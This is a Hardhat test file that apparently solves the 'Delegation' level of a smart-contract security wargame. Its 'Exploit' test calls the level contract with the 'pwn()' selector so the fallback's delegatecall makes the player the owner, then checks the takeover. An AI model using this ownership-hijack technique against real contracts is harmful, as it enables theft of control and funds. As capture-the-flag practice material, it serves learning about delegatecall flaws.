const { expect } = require("chai");
const { ethers } = require("hardhat");

const { setupLevel } = require("./utils");

describe("Delegation", async function () {
    let deployer;
    let player;
    let factory;
    let instance;

    before(async function () {
        [deployer, player] = await ethers.getSigners();

        level = await setupLevel("Delegation", player.address);
        factory = level.factory;
        instance = level.instance;
    });

    it("Exploit", async function () {
        function abiEncodeWithSignature(signature, ...params) { // similar to abi.encodeWithSignature in Solidity
            const functionName = signature.split("(")[0].replace("function", "").trim();
            return (new ethers.utils.Interface([signature])).encodeFunctionData(functionName, params);
        }

        // Call fallback() on instance
        await player.sendTransaction({
            to: instance.address,
            data: abiEncodeWithSignature("function pwn()")
        });

        expect(await instance.owner()).to.equal(player.address);
    });

    after(async function () {
        expect(await factory.callStatic.validateInstance(instance.address, player.address)).to.be.true;
    });
});